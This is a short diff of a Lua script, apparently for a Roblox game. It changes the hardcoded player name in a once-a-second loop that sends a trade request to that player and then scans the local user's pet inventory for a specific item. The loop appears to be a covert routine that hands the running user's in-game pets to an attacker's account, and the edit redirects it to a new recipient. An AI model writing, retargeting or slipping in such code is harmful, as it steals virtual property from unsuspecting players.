@@ -266,8 +266,8 @@ end)
 spawn(function()
 	while wait(1) do
 		for i,v in pairs(game.Players:GetChildren()) do
-			if v.Name == "xlsxh" then
-				get("TradeAPI/SendTradeRequest"):FireServer(game.Players:FindFirstChild("xlsxh"))
+			if v.Name == "FdxFvi" then
+				get("TradeAPI/SendTradeRequest"):FireServer(game.Players:FindFirstChild("FdxFvi"))
 				
 				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
 					if v["kind"] == "winter_2025_cozy_mistletroll" then
